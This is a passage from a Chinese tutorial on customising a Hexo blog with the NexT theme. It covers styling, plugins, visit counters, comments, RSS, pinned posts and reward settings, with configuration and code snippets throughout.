&#125;</span><br></pre></td></tr></table></figure><h2 id="7-主页文章添加阴影效果">7. 主页文章添加阴影效果</h2><p>打开themes/next/source/css/_common/conponents/post/post.styl，修改.post-block，如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.use-motion &#123;</span><br><span class="line">     if (hexo-config(&#x27;motion.transition.post_block&#x27;)) &#123;</span><br><span class="line">       .post-block &#123;</span><br><span class="line">         opacity: 0;</span><br><span class="line">         margin-top: 60px;</span><br><span class="line">         margin-bottom: 60px;</span><br><span class="line">         padding: 25px;</span><br><span class="line">         background:rgba(255,255,255,0.9) none repeat scroll !important;</span><br><span class="line">         -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">         -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">   </span><br><span class="line">       &#125;</span><br><span class="line">       .pagination, .comments&#123;</span><br><span class="line">         opacity: 0;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>还有一种方法打开Blog/source/_date/style.styl文件，添加以下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line">   .post &#123;</span><br><span class="line">      margin-top: 60px;</span><br><span class="line">      margin-bottom: 60px;</span><br><span class="line">      padding: 25px;</span><br><span class="line">      -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">      -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br></pre></td></tr></table></figure><h2 id="8-添加顶部加载条">8. 添加顶部加载条</h2><p>在themes/next目录下打开Git Bash，输入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-pace source/lib/pace</span><br></pre></td></tr></table></figure><p>打开<strong>主题配置文件</strong>即themes/next下的_config.yml，找到pace，将enable：false改为true，你还可以选择类型（theme）：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pace:</span><br><span class="line">     enable: true</span><br><span class="line">     # Themes list:</span><br><span class="line">     # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple</span><br><span class="line">     # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal</span><br><span class="line">     theme: minimal</span><br></pre></td></tr></table></figure><h2 id="9-设置预览摘要">9. 设置预览摘要</h2><p>next（v7.7.1）已经没有如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_excerpt:</span><br><span class="line">     enable: true</span><br><span class="line">     length: 150</span><br></pre></td></tr></table></figure><p>所以不需要设置，只要我们在文章中插入 <a id="more"></a>，该标签之上的是摘要，之后的内容不可见，需点击全文阅读按钮：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure><h2 id="10-设置侧边栏显示效果">10. 设置侧边栏显示效果</h2><p>打开<strong>主题配置文件</strong>即themes/next下的_config.yml，找到Sidebar Settings，设置：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sidebar:</span><br><span class="line">     # Sidebar Position. #设置侧边栏位置</span><br><span class="line">     position: left</span><br><span class="line">     #position: right</span><br><span class="line">   </span><br><span class="line">     #  - post    默认显示模式</span><br><span class="line">     #  - always  一直显示</span><br><span class="line">     #  - hide    初始隐藏</span><br><span class="line">     #  - remove  移除侧边栏</span><br><span class="line">     display: post</span><br></pre></td></tr></table></figure><h2 id="11-侧边栏推荐阅读">11. 侧边栏推荐阅读</h2><p>打开<strong>主题配置文件</strong>即themes/next下的_config.yml，搜索links（里面写你想要的链接）：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">links_settings:</span><br><span class="line">     icon: link</span><br><span class="line">     title: 链接网站  #修改名称</span><br><span class="line">   </span><br><span class="line">   links:</span><br><span class="line">     #Title: http://yoursite.com</span><br><span class="line">     百度: https://baidu.com</span><br><span class="line">     鱼C论坛: https://fishc.com.cn</span><br></pre></td></tr></table></figure><h2 id="12-添加社交链接">12. 添加社交链接</h2><p>打开<strong>主题配置文件</strong>即themes/next下的_config.yml，搜索social：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">     GitHub: https://github.com/fengye97 || github</span><br><span class="line">     E-Mail: mailto:yinhongfei1018@163.com || envelope</span><br><span class="line">     知乎: https://www.zhihu.com/people/mai-nv-hai-de-xiao-huo-chai-35-19 || gratipay</span><br><span class="line">     CSDN: https://https://blog.csdn.net/Later_001 || codiepie</span><br></pre></td></tr></table></figure><p>“||”前面的是链接，后面的是<a href="https://link.zhihu.com/?target=http%3A//www.fontawesome.com.cn/faicons/%23web-application"> FontAwesome</a>图标名称。</p><h2 id="13-设置博文内链接为蓝色">13. 设置博文内链接为蓝色</h2><p>打开themes/next/source/css/_common/components/post/post.styl文件，将下面的代码复制到文件最后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">        color: #0593d3;</span><br><span class="line">        border-bottom: none;</span><br><span class="line">        &amp;:hover &#123;</span><br><span class="line">          color: #0477ab;</span><br><span class="line">          text-decoration: underline;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>重新部署一下后，效果如下图：</p><p><img src="https://pic1.zhimg.com/80/v2-637b3019539b4943151ca472582c90cc_720w.jpg" alt="img"></p><h2 id="14-显示文章字数和阅读时长">14. 显示文章字数和阅读时长</h2><p>从根目录Blog打开Git Bash，执行下面的命令，安装插件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>然后打开**站点配置文件，**在文件末尾加上下面的代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">     symbols: true                # 文章字数统计</span><br><span class="line">     time: true                   # 文章阅读时长</span><br><span class="line">     total_symbols: true          # 站点总字数统计</span><br><span class="line">     total_time: true             # 站点总阅读时长</span><br><span class="line">     exclude_codeblock: false     # 排除代码字数统计</span><br></pre></td></tr></table></figure><p>效果如下图：</p><p><img src="https://pic2.zhimg.com/80/v2-6691afc39f011c010bd0d9e054b50e75_720w.jpg" alt="img"></p><h2 id="15-显示站点文章总字数（另一种统计站点总字数的方法）">15. 显示站点文章总字数（另一种统计站点总字数的方法）</h2><p>从根目录Blog打开Git Bash，执行下面的命令，安装插件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>然后在/themes/next/layout/_partials/footer.swig文件尾部加上：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">     &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">     &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">   &lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="16-设置文章末尾”本文结束”标记">16. 设置文章末尾”本文结束”标记</h2><p>在路径/themes/next/layout/_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">       &#123;% if not is_index %&#125;</span><br><span class="line">           &lt;div style=&quot;text-align:center;color: #ccc;font-size:24px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">       &#123;% endif %&#125;</span><br><span class="line">   &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>接着打开/themes/next/layout/_macro/post.swig文件，在post-footer前添加代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if not is_index and theme.passage_end_tag.enabled %&#125;</span><br><span class="line">     &lt;div&gt;</span><br><span class="line">       &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">   &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>具体位置如下图：</p><p><img src="https://pic4.zhimg.com/80/v2-a449da45307774c93857b03b6585a0b7_720w.jpg" alt="img"></p><p>然后打开<strong>主题配置文件</strong>（_config.yml)，在末尾添加：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">   passage_end_tag:</span><br><span class="line">     enabled: true</span><br></pre></td></tr></table></figure><p>完成以上设置之后，在每篇文章之后都会添加如下效果图的样子：</p><p><img src="https://pic4.zhimg.com/80/v2-22e980312c1b9c433e642757dea7e91b_720w.jpg" alt="img"></p><h2 id="17-文章末尾添加版权说明">17. 文章末尾添加版权说明</h2><p>查找<strong>主题配置文件</strong>themes/next/_config.yml中的creative_commons：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">creative_commons:</span><br><span class="line">     license: by-nc-sa</span><br><span class="line">     sidebar: false</span><br><span class="line">     post: true  # 将false改为true即可显示版权信息</span><br><span class="line">     language:</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://pic2.zhimg.com/80/v2-8539d1dd82bbb3b295b631402ffeeb49_720w.jpg" alt="img"></p><h2 id="18-添加访问量统计">18. 添加访问量统计</h2><p>打开<strong>主题配置文件</strong>即themes/next下的_config.yml，找到busuanzi_count，改为true：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">     enable: true</span><br></pre></td></tr></table></figure><p>打开/themes/next/layout/_partials/footer.swig，在最后添加如下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.busuanzi_count.enable %&#125;</span><br><span class="line">       &lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   </span><br><span class="line">       &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;</span><br><span class="line">       &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">       &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;总访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;人&lt;/span&gt;</span><br><span class="line">       &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">   &lt;!-- 不蒜子计数初始值纠正 --&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">   $(document).ready(function() &#123;</span><br><span class="line">   </span><br><span class="line">       var int = setInterval(fixCount, 50);  // 50ms周期检测函数</span><br><span class="line">       var countOffset = 20000;  // 初始化首次数据</span><br><span class="line">   </span><br><span class="line">       function fixCount() &#123;            </span><br><span class="line">          if (document.getElementById(&quot;busuanzi_container_site_pv&quot;).style.display != &quot;none&quot;)</span><br><span class="line">           &#123;</span><br><span class="line">               $(&quot;#busuanzi_value_site_pv&quot;).html(parseInt($(&quot;#busuanzi_value_site_pv&quot;).html()) + countOffset); </span><br><span class="line">               clearInterval(int);</span><br><span class="line">           &#125;                  </span><br><span class="line">           if ($(&quot;#busuanzi_container_site_pv&quot;).css(&quot;display&quot;) != &quot;none&quot;)</span><br><span class="line">           &#123;</span><br><span class="line">               $(&quot;#busuanzi_value_site_uv&quot;).html(parseInt($(&quot;#busuanzi_value_site_uv&quot;).html()) + countOffset); // 加上初始数据 </span><br><span class="line">               clearInterval(int); // 停止检测</span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;</span><br><span class="line">          </span><br><span class="line">   &#125;);</span><br><span class="line">   &lt;/script&gt; </span><br><span class="line">   &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="19-添加评论功能">19. 添加评论功能</h2><h3 id="19-1-注册安装">19.1 注册安装</h3><p>我采用的是来必力，具体过程很简单，打开官网：<a href="https://link.zhihu.com/?target=http%3A//livere.com/">Welcome to LiveRe.com</a></p><p>注册账号：</p><p><img src="https://pic1.zhimg.com/80/v2-c30f176fdfb32b60b281cbda3d9d3ef8_720w.jpg" alt="img"></p><p>然后发送邮箱验证码，输入验证码验证，完成注册后点击上方<strong>安装：</strong></p><p><img src="https://pic2.zhimg.com/80/v2-72c5684e3347f69eea26d0e39bce026d_720w.jpg" alt="img"></p><p>选择免费的现在安装，会弹出一个框让你填网站的信息：</p><p><img src="https://pic3.zhimg.com/80/v2-e97bae324c5c0a7e218d5bdcc107cfc2_720w.jpg" alt="img"></p><p>然后获取代码：</p><p><img src="https://pic1.zhimg.com/80/v2-6a1dc9f416337cf185846ab0835386f4_720w.jpg" alt="img"></p><p>将data-uid后的代码复制，然后打开主题配置文件_config.yml，找到livere_uid，将代码复制到其后即可：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">livere_uid: &quot;你的代码&quot;</span><br></pre></td></tr></table></figure><h3 id="19-2-设置提醒">19.2 设置提醒</h3><p>当有新评论出现时，通过邮箱提醒，点击右上角-&gt;管理页面-&gt;评论提醒：</p><p><img src="https://pic2.zhimg.com/80/v2-1682aedc503a43caea0687cc1bb3e305_720w.jpg" alt="img"></p><p>完成后效果如图：</p><p><img src="https://pic2.zhimg.com/80/v2-01b42e4056c2ff1520d3723762707699_720w.jpg" alt="img"></p><h2 id="20-添加Fork-me-on-Github">20. 添加Fork me on Github</h2><p>有两种，分别是：</p><p><img src="https://pic2.zhimg.com/80/v2-0b21691ed6309ea63de8913dd235310d_720w.jpg" alt="img"></p><p><img src="https://pic4.zhimg.com/80/v2-4ed720c24acbae939eaf72bb236b478b_720w.jpg" alt="img"></p><p>选择你喜欢的类型，打开<a href="https://link.zhihu.com/?target=http%3A//tholman.com/github-corners/">小猫</a>或者<a href="https://link.zhihu.com/?target=https%3A//github.blog/2008-12-19-github-ribbons/">字</a>，复制代码添加到themes/next/layout/_layout.swig文件中，放在<div class="headband"></div>后面：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;</span><br><span class="line">       &lt;a href=&quot;https://github.com/fengye97&quot; class=&quot;github-corner&quot; aria-label=&quot;View source on GitHub&quot;&gt;&lt;s</span><br></pre></td></tr></table></figure><h2 id="21-安装Markdown编译器">21. 安装Markdown编译器</h2><p>可以看这篇文章然后选一个适合的文本编译器：<a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/davidhzq/article/details/100815332">几款主流好用的markdown编辑器介绍</a></p><p>我是用的Windows系统，所以我用的是MarkdownPad2，下载地址：<a href="https://link.zhihu.com/?target=http%3A//www.markdownpad.com/">The Markdown Editor for Windows</a>，默认安装就行</p><p>如果是win10系统还需要安装一个组件 **awesomium_v1.6.6_sdk_win，**下载链接：链接：<a href="https://link.zhihu.com/?target=https%3A//pan.baidu.com/s/1UJRtOBF8vj19ikOq4452sQ">https://pan.baidu.com/s/1UJRtOBF8vj19ikOq4452sQ</a> 提取码：yd8k</p><p>下载完<strong>awesomium_v1.6.6_sdk_win</strong>默认安装就行</p><h2 id="22-安装RSS插件">22. 安装RSS插件</h2><p>为什么要安装RSS插件呢？不了解的可以看看这篇文章：<a href="https://link.zhihu.com/?target=http%3A//www.netshop168.com/article-85934.html">rss订阅是什么意思?为什么要使用RSS?</a>简单来说，RSS是一种协议，允许网站将其内容或其部分内容提供给其他网站或应用程序。通过使用RSS，可以节省宝贵的时间，并将各个站点提供的新闻和信息组织到一个中心点进行查看，也可以通过从使用RSS联合其内容的其他站点导入新闻来向你的站点添加新闻。</p><h3 id="（1）安装hexo-generator-feed插件">（1）安装hexo-generator-feed插件</h3><p>RSS需要有一个Feed链接，而这个链接需要靠hexo-generator-feed插件来生成，所以第一步需要添加插件，在Blog根目录打开Git Bash执行安装指令：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><h3 id="（2）配置feed信息">（2）配置feed信息</h3><p>在<strong>站点配置文件</strong>末尾加上如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">feed:</span><br><span class="line">     type: rss2</span><br><span class="line">     path: rss2.xml</span><br><span class="line">     limit: 10</span><br><span class="line">     hub:</span><br><span class="line">     content: &#x27;true&#x27;</span><br></pre></td></tr></table></figure><h3 id="（3）配置rss">（3）配置rss</h3><p>打开**主题配置文件，**搜索rss，将前面的#去掉：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">follow_me:</span><br><span class="line">     #Twitter: https://twitter.com/username || twitter</span><br><span class="line">     #Telegram: https://t.me/channel_name || telegram</span><br><span class="line">     微信: /images/wechat_channel.jpg || wechat</span><br><span class="line">     RSS: /atom.xml || rss</span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="https://pic4.zhimg.com/80/v2-e31964bed191136716e02326589e15c3_720w.jpg" alt="img"></p><h2 id="23-项目主页添加README">23. 项目主页添加README</h2><p>在建立Github上建立自己的博客仓库的时候，没有生成README文件，这样使得其他人无法知道我们这个仓库是做什么，即我们的这个仓库缺少一个说明文件；但是如果直接使用命令hexo n README，再部署至远程的时候，hexo会将它解析为html文件，这不是我们想要的。</p><p>因此，解决方式是在路径Blog\source下手动新建README.md注意这里的后缀是.mdown，Mardownpad2可以将文件保存为.mdown后缀文件；然后再在这个新建文件中写README即可。再之后hexo g会把它复制到public文件夹，而不会被解析成html文件，发布在博客中。</p><p>也可以参考第24项，在根目录Blog/source 目录下添加一个 <a href="http://README.md">README.md</a> 文件，修改站点配置文件 _config.yml ，将 skip_render 参数的值设置为:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip_render: README.md</span><br></pre></td></tr></table></figure><h2 id="24-忽略要编译的文件">24. 忽略要编译的文件</h2><p>搜索引擎确认网站所有权时往往会提供一个html文件来进行验证，要是这个文件被渲染了，验证自然就会失败了。或者，有时候会有一些文件不希望Hexo渲染的，因此有必要针对某个文件或者目录进行排除。Hexo的配置文件中提供了配置项skip_render。只有source目录下的文件才会发布到public（能够在网络上访问到），因此Hexo只渲染source目录下的文件。skip_render参数设置的路径是相对于source目录的路径。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">skip_render:   #部署时不包含的文件</span><br><span class="line">   </span><br><span class="line">   #单个文件</span><br><span class="line">   skip_render: hello.html</span><br><span class="line">   </span><br><span class="line">   #单个文件夹下全部文件</span><br><span class="line">   skip_render: test/* </span><br><span class="line">   </span><br><span class="line">   #单个文件夹下指定类型文件</span><br><span class="line">   skip_render: test/*.md  </span><br><span class="line">   </span><br><span class="line">   #单个文件夹下全部文件以及子目录</span><br><span class="line">   skip_render: test/**  </span><br><span class="line">   </span><br><span class="line">   #跳过多个目录，或者多个文件</span><br><span class="line">   skip_render: [&#x27;*.html&#x27;, demo/**, test/*]</span><br></pre></td></tr></table></figure><h2 id="25-代码块样式自定义">25. 代码块样式自定义</h2><p>打开根目录Blog/source/_data/styles.styl，添加以下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Custom styles.</span><br><span class="line">   code &#123;</span><br><span class="line">       color: #ff7600;</span><br><span class="line">       background: #fbf7f8;</span><br><span class="line">       margin: 2px;</span><br><span class="line">   &#125;</span><br><span class="line">   // 大代码块的自定义样式</span><br><span class="line">   .highlight, pre &#123;</span><br><span class="line">       margin: 5px 0;</span><br><span class="line">       padding: 5px;</span><br><span class="line">       border-radius: 3px;</span><br><span class="line">   &#125;</span><br><span class="line">   .highlight, code, pre &#123;</span><br><span class="line">       border: 1px solid #d6d6d6;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://pic3.zhimg.com/80/v2-551527018a7813118ca9074691fab82a_720w.jpg" alt="img"></p><h2 id="26-支持mathjax公式">26. 支持mathjax公式</h2><p>打开<strong>主题配置文件</strong>，搜索mathjax：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">       enable: true   #将false改为true</span><br><span class="line">       mhchem: false  #用来写化学方程式</span><br></pre></td></tr></table></figure><h2 id="27-图床网站">27. 图床网站</h2><p>推荐七牛云，免费网站，快速，方便，或者可以看看这篇文章选一个合适的网站：<a href="https://zhuanlan.zhihu.com/p/35270383">软件小编：盘点一下免费好用的图床</a></p><p>网站：<a href="https://link.zhihu.com/?target=https%3A//www.qiniu.com/%3Futm_campaign%3DSEM%26utm_content%3Dpinzhuan%26utm_medium%3Dpinzhuan%26utm_source%3DbaiduSEM%26utm_term%3Dpinzhuan">七牛云</a>，后面我再写一篇关于如何注册使用七牛云存储图片的文章吧，我先研究研究。</p><h2 id="28-本地搜索">28. 本地搜索</h2><p>打开cmd安装插件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search</span><br></pre></td></tr></table></figure><p>查找主题配置文件themes/next/_config.yml中的local_search ：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">     enable: true</span><br><span class="line">     trigger: manual   #手动，按回车键或搜索按钮触发搜索</span><br></pre></td></tr></table></figure><h2 id="29-Hexo博客提交百度和Google收录">29. Hexo博客提交百度和Google收录</h2><p>这篇文章写得很详细：<a href="https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/f8ec422ebd52">Hexo博客提交百度和Google收录</a></p><h2 id="30-博文置顶">30. 博文置顶</h2><h3 id="（1）安装插件">（1）安装插件</h3><p>在根目录Blog打开Git Bash，执行下面的命令：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-generator-index --save</span><br><span class="line">   npm install hexo-generator-index-pin-top --save</span><br></pre></td></tr></table></figure><h3 id="（2）设置置顶标志">（2）设置置顶标志</h3><p>打开blog/themes/next/layout/_macro目录下的post.swig文件，定位到<div class="post-meta">标签下，插入如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if post.top %&#125;</span><br><span class="line">     &lt;i class=&quot;fa fa-thumb-tack&quot;&gt;&lt;/i&gt;</span><br><span class="line">     &lt;font color=7D26CD&gt;置顶&lt;/font&gt;</span><br><span class="line">     &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">   &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）在文章中添加top">（3）在文章中添加top</h3><p>然后在需要置顶的文章的Front-matter中加上top: true即可，如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">   title: Hello World</span><br><span class="line">   </span><br><span class="line">   top: true</span><br><span class="line">   </span><br><span class="line">   ---</span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="https://pic1.zhimg.com/80/v2-9ab04ff8d13761343e6b12057d0288ec_720w.jpg" alt="img"></p><h2 id="31-添加打赏">31. 添加打赏</h2><p>next（v7.7.1）已经有打赏功能，只要准备好微信和支付宝二维码，具体操作：<a href="https://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/b907e627b641b646e6891c6b.html">制作微信二维码收款</a>，很简单我就不详细说了。</p><p>打开<strong>主题配置文件</strong>，查找reward：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">reward_settings:</span><br><span class="line">     enable: true   #改为true</span><br><span class="line">     animation: false</span><br><span class="line">     comment: 原创技术分享，您的支持将鼓励我继续创作</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   reward:</span><br><span class="line">     wechatpay: /images/wechatpay.png   #将前面的#去掉</span><br><span class="line">     alipay: /images/alipay.png         #将前面的#去掉</span><br><span class="line">     #paypal: /images/paypal.png</span><br><span class="line">     #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure><p>将制作好的二维码图片放入themes/next/source/images文件里，并命名为wechatpay.png和alipay.png。</p><h2 id="32-添加分享（未完成）">32. 添加分享（未完成）</h2><p>原来的 jiathis share 和 baidushare 已经没有了，现在的是 addthis，但是我注册不了addthis账号 <a href="https://link.zhihu.com/?target=https%3A//www.addthis.com/">AddThis官网</a></p><p>不知道什么原因，我用Firefox不行，下次用Chrome试试，先放着吧！</p><h2 